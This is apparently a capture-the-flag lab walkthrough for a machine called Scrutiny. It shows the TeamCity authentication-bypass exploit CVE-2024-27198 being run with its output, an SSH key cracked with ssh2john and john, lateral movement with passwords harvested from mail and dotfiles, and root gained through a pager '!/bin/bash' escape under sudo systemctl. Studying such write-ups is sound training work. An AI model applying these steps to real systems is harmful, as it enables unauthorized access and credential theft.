##### Tags: `teamcity`  `ssh2john`  `id_rsa`  `/var/mail`  `!/bin/bash`

# 🐧Scrutiny🐧
## Enumeration
Nmap
```
$ nmap -p- -T4 -sV 192.168.247.91

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
25/tcp  open   smtp    Postfix smtpd
80/tcp  open   http    nginx 1.18.0 (Ubuntu)
443/tcp closed https
Service Info: Host:  onlyrands.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 80 is running teamcity and there is a login page  
search and found CVE-2024-27198  
searchsploit got the authentucation bypass  
```
$ searchsploit TeamCity                
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
JetBrains TeamCity 2023.11.4 - Authentication Bypass                            | multiple/webapps/52411.py
```
download and run the script 
```
$ python3 52411.py --url http://teams.onlyrands.com/login.html

 ████████╗███████╗ █████╗ ███╗   ███╗ ██████╗██╗████████╗██╗   ██╗                                                
 ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██╔════╝██║╚══██╔══╝╚██╗ ██╔╝                                                
    ██║   █████╗  ███████║██╔████╔██║██║     ██║   ██║    ╚████╔╝                                                 
    ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║██║     ██║   ██║     ╚██╔╝                                                  
    ██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╗██║   ██║      ██║                                                   
    ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝╚═╝   ╚═╝      ╚═╝                                                   
                                                                                                                  
    TeamCity Authentication Bypass (CVE-2024-27198)
                Author: ibrahimsql

=== CVE-2024-27198 TeamCity Exploit ===
Author: ibrahimsql
Target: http://teams.onlyrands.com/login.html
=============================================

[*] Checking target: http://teams.onlyrands.com/login.html
[+] Target is reachable
[*] Targeting: http://teams.onlyrands.com/login.html/idontexist?jsp=/app/rest/users;.jsp
[*] Attempting authentication bypass...
[+] Exploit successful!

[SUCCESS] Admin user created!
==================================================
Username: ibrahimsql
Password: ibrahimsql
Login URL: http://teams.onlyrands.com/login.html/login.html
==================================================
[+] Exploit completed!
```
we got the username and password created - ibrahimsql ibrahimsql
after logged in and found there is a id_rsa private key in the project of Marco Tillman
```
Signed-off-by: Marco Tillman <marcot@onlyrands.com>
1 File
removed
id_rsa
```
then we crack the key using ssh2john to create the cracking hash  
and crack the hash to get the password
```
└─$ ssh2john id_rsa > hash                                                                                                                            

└─$ cat hash  
id_rsa:$sshng$6$16$b3a5991a43be04206be09c20b0d31f88$1910$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010b3a5991a43be04206be09c20b0d31f88000000100000000100000197000000077373682d727361000000030100010000018100d2d6125ac06ee8e24dd6746b8cffad12ed1aa881fcefd2735399fe3f6c464fac57136e22d8779dbd6c051242b1d7b073a81f80b13daa4819a65ef40eedc6e079566077f7ff6ac7dc26acea69641046be8c8b2fda1ac1c28651c5e9225aa6021c09c0ba496a0ccf231c381f3d3226fd87a2f245c795b2bcf2d991807862bce4d12b41291d7a5320d257fd09ca8098c69138585b12b6597ca3f87fce25f4de8a24aff9f463883d8eae73b106d631de2f3798cfd5e2b8de7191e3823537ab1e6c649422e7a73d588306c0660b2e8dacb2b6e5cf273981c246851f189c55c2187c97ffdad6a27680bc23907cf5939ce109b1589177fdd8a53a7d2af7da325e612a1219aab2c9534d7dbed4a38e0d7fbf10bc382946481d8c775ed258375a4dae56ffceb74b2cd3112d5ad958450fb6e16a464696f4cbf5af01a473b99749a810da9a67fb3c4ae0a34021f2bd71b8476bdef17b0e113ffb9e4f82dc1b6439b1c9a8ad113e7f12f9cd38f33ec92db4f7e94955bea05d2284a58ac29ca3cf8a86c4862100000590a78e4951bb048a88d82594572826df3d7dd89228fcea8e13cd8ee3e5e6fe8a6a7e8bf37fc616e73c4042cb74d236237269bd84798a8f023cac5ab7c8a84be64062ccf8a7a22acb170c8c1c64f7f1e7f7b31604cb4edfd7516a48e62ed2127a86e3143a35029ad68dd2406d7f474b60b0328f1626ec949f896895d0fb553422736135eec22086b2b41fef3265393a5945229bf751da8b66dfd05c28d9ae9a86498f0609d7e441ff75aedc16e458ddbc5b9ae1dc8ca438cf28901da167e026411a639ad9caf693cfbcad70c6e147b63f1feedf07f326df129a44d7c6ba385a767afa84d4b0a03c71a8c3674bb82792f8f2b685bc00252d34309c0116f1f4217fa14e7ebbb9907b2426e8ee1ff2167896d3b2a30dc603b0057928f30199360b9b12d823e283f60cb38287b0f14ae4622d999b001f5a61f230d64c573a74de019ccb3f2f2538efeb5ba46610c9de3917a2f953af98a54863986825b32939ddaeb35ee7327f1848f65bce9e363bc2532f98fd3bb8addae4d8065261feb8f294e61d1b49d891f99fa267293055bfeb2803a9b0f62733e3865f89a76680b7292150589ed78e8ca079bf412db225cbe99f75c7fd13ff1d7eb323673061d8073727eda35ab6b2ee59aff462bd340b2f44ff8c6b75e007ccf89e19d6bad890cfaae90c4cf07576aa364d8909f291b9e617d1a294c026e3e85fcc5dd7d995c55b02d0d8aeaded545e333e89fc9fc3c6f9baf4c4fe21f1d15cc80a4ada5e508b879938af33d49f864f8a341cf692d1c19b3bd01e15a38fb018d56c8561762e3ffcd0876fb5d987964182e249a5f3cf007f2ce26692a2c3cb9f1616c541dd1912a0b1aa769fc4dbf8339171211804d9b88e446edda56e39e0fa2bcda6ab364a34a6e7c03ca0c0503a62ab023ca7aa1629133190c5930c0114ef212cf33f11f2146ea04a0ba44a5b681b575a3597ae3c9b564e16e7b3b16888ec65d073b2572d568850c130232e787b9419b16b90820e5384f7321c6627dcf057893edfb06b730c89fbc00f3a307cb6353be2095cdeaaa4db77e422baafe84b129b0c8a26ef3771e9ae104c422519009c69e715f9b7bbf8ec15fa30d289f4360fdd8b2897c6821be63b60e678b240bd57bf7978378367763bf58d8619fb813747f1b56d18d9861e11135eeb523550439e770423e137954785fe98f0119ecbffe7484d5d767aa5458ea81a892856d29f84da53e06a1f444140bee0a4c9fd41006b77f3f35595eb66d1a380011c3b755ff69dec90e9ecc2fdbd97b01397d3c8409674943d3c7b38fa023d2e24472b1e92e5fa1363b50972a5aabd57e24beabb5ea6b2fd08d05325d4df2a6330f1040d47e625b5c3cdfdff5b8eb46f085a951358d8fb5b15bf8724c4b8ac8edbc246165e097895ffbc2cf9a4e6de1d641d91ebb898f9f9cafb4e2b2cc0dec7cf800ac47136535adefe89a4d5b92ba4632e553c2990635278cf0fe5ccc11f5e3897126d5eb7272cb02820bded1170ab2262bdbb8cbdf4a2ec34c4103bb259c24fd005f6c2bc6393a1c137646c906045914778917bfd7fb38e608fd020e2bd45a6dec04060c98272d9833c22cc21d80a9f2bed9f0d8f99d2c4c9b2de55a25ba9ef941badc0016914a940c0960b5ffef429a327e55918596c561da6adc8a68d7f672299c20eacd16b6cc2340f00dffe102f86c0fc2a42a9a99451833023e6278ece42e29c5f271795d1bfee0f09816f4fda4a60760f2afcd6aacadee57a986950eaa59b16f041c9428273704aaaa4f4053ed08776f2c494ce291fc98b33ed0d78ebb8af060e280ff122645d4c9463b4e7c873d9923c11fc6c19be0ef0f5ee0df874f17ca7632d10ed1a668378f07e83ed04a52f455dd8c2dd41d8d2232d8a7aae5fcc16152a45fcfd27a204ec5f994358e3bcfcd2cb6ebb05501f127002db64fffb8e74e6572a888fa6ea8184d9203a60b0e221a38a2f560d68b9c9c344cc93f441d5f78c9521e610ce66a05055ea3ea1553123$16$486
```
cracked the password with john and we got cheer
```
$ john --wordlist=/home/ming/Downloads/rockyou.txt hash  
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cheer            (id_rsa)     
```
i tried a lot of combination of username Marco Tillman and finally found macrot
```
$ ssh marcot@192.168.247.91 -i id_rsa   
You have mail.
Last login: Sat Feb 14 07:04:40 2026 from 192.168.45.210
marcot@onlyrands:~$ id
uid=1012(marcot) gid=1004(freelancers) groups=1004(freelancers)
```
it says you have mail when i logged in so i go to check the mailbox in /var/mail  
and i found the password of dach 'IdealismEngineAshen476'
```
marcot@onlyrands:/var/mail$ cat marcot
From matthewa@onlyrands.com  Fri Jun  7 09:33:48 2024
Return-Path: <matthewa@onlyrands.com>
X-Original-To: marcot@onlyrands.com
Delivered-To: marcot@onlyrands.com
Received: by onlyrands.com (Postfix, from userid 1010)
        id E8D713650; Fri,  7 Jun 2024 09:33:48 +0000 (UTC)
From: matthewa@onlyrands.com
To: marcot@onlyrands.com
Subject: Goodbye, best friend
Date: Fri,  18 Feb 2022 08:43:11 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20240607093348.E8D713650@onlyrands.com>

Marco,

Dach, the imbecile, forgot to disable my access, so you can login using my account. The password is "IdealismEngineAshen476" (without the quotation marcot).

I've left you a parting gift--your eyes only.
I'm gonna miss you, pal. Catch you on the flip side.

Sincerely,
Matthew A.
```
i found the sender is matthew A. which is the user matthewa from /etc/passwd
```
marcot@onlyrands:/var/mail$ cat /etc/passwd
matthewa:x:1010:1004:Matthew Armstrong,,,:/home/freelancers/matthewa:/usr/bin/bash

marcot@onlyrands:/var/mail$ su matthewa
Password: 
matthewa@onlyrands:/var/mail$ id
uid=1010(matthewa) gid=1004(freelancers) groups=1004(freelancers)
```
i search from the home directory and found unusual file contains the password of Dash
```
matthewa@onlyrands:~$ ls -la
total 44
drwxrwx---+ 3 matthewa freelancers 4096 Jun  7  2024 .
drwxrwxr-x+ 7 root     root        4096 Jun  7  2024 ..
-r--------+ 1 matthewa freelancers  120 Jun  7  2024 .~
-rw-rwxr--+ 1 matthewa freelancers  220 Jun  7  2024 .bash_logout
-rw-rwxr--+ 1 matthewa freelancers 3790 Jun  7  2024 .bashrc
-rw-rw----+ 1 matthewa freelancers  119 Jun  7  2024 .gitconfig
-rw-rwxr--+ 1 matthewa freelancers  807 Jun  7  2024 .profile
drwxrwx---+ 3 matthewa freelancers 4096 Jun  7  2024 work
matthewa@onlyrands:~$ cat .~
Dach's password is "RefriedScabbedWasting502". I saw it once when he had to use my terminal to check TeamCity's status.
```
look at the passwd file again and found dach is the username briand
```
matthewa@onlyrands:~$ cat /etc/passwd
briand:x:1003:1001:Brian Dach,,,:/home/administration/briand:/bin/bash
```
switch to briand
```
matthewa@onlyrands:~$ su briand
Password: 

briand@onlyrands:/home$ id
uid=1003(briand) gid=1001(administration) groups=1001(administration)
```
## Privilege Escalation
sudo -l found the user briand can run systemctl with root access
```
briand@onlyrands:/home$ sudo -l
Matching Defaults entries for briand on onlyrands:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User briand may run the following commands on onlyrands:
    (root) NOPASSWD: /usr/bin/systemctl status teamcity-server.service
```
run the command then run !/bin/bash to get root shell
```
briand@onlyrands:/home$ sudo /usr/bin/systemctl status teamcity-server.service
● teamcity-server.service - TeamCity Server
     Loaded: loaded (/lib/systemd/system/teamcity-server.service; enabled; vendor preset: enabled)
     Active: active (running) since Mon 2024-08-05 17:15:20 UTC; 1 years 6 months ago
   Main PID: 832 (sh)
      Tasks: 157 (limit: 2255)
     Memory: 1.1G
     CGroup: /system.slice/teamcity-server.service
             ├─ 832 sh teamcity-server.sh _start_internal
             ├─ 841 sh /srv/git/software/TeamCity/bin/teamcity-server-restarter.sh run
             ├─1207 /usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -Djava.util.logging.config.file=/srv/git/soft>
             └─1781 /usr/lib/jvm/java-11-openjdk-amd64/bin/java -DTCSubProcessName=TeamCityMavenServer -classpath>

Aug 05 17:15:20 onlyrands.com systemd[1]: Starting TeamCity Server...
Aug 05 17:15:20 onlyrands.com teamcity-server.sh[792]: Spawning TeamCity restarter in separate process
Aug 05 17:15:20 onlyrands.com teamcity-server.sh[792]: TeamCity restarter running with PID 832
Aug 05 17:15:20 onlyrands.com systemd[1]: Started TeamCity Server.
!/bin/bash
root@onlyrands:/home# id
uid=0(root) gid=0(root) groups=0(root)
root@onlyrands:/home# 
```
